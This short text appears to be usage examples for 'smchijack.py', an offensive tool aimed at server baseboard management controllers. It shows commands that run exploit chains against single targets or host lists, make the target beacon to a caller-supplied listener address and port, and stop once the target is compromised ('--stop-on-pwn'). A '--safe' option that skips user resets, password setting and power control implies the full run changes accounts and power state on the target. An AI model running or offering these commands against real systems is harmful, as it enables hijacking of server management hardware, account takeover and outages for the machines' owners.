# self-test every builder without touching a target
./smchijack.py --self-test

# default chain against one BMC
./smchijack.py 10.0.0.5

# every module, JSON output, caller-supplied beacon address
./smchijack.py 10.0.0.5 --all -l 10.0.0.1 -p 8899 --json out.json

# read-only: no user reset, no password set, no power control
./smchijack.py 10.0.0.5 --safe

# stop the moment anything succeeds
./smchijack.py 10.0.0.5 --stop-on-pwn

# scan a list, eight at a time
./smchijack.py hosts.txt --threads 8
